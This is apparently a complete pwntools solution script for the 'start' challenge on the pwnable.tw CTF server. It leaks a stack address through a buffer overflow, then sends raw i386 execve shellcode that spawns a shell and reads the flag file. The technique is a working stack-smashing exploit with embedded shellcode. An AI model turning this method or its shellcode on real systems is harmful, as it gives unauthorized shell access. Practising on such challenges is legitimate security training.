#!/usr/bin/python3
from pwn import *
import sys
elf = context.binary = ELF("start")
context.arch = 'i386'
def start():
    if args.GDB:
        context.terminal = ['tmux', 'splitw', "-h"]
        return gdb.debug(elf.path)
    else:
        return remote('chall.pwnable.tw', 10000)
##############################
io = start()
# call write to write to where $eip points
print(io.recv(21))
io.send(b'\x90'*20 + p32(0x8048087))
leak = u32(io.recv()[:4])
log.info(f"leak {hex(leak)}")
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
io.send(b'\x90'*20 + p32(leak+20) + shellcode)
io.sendline(b'cat /home/start/flag')
io.interactive()
##############################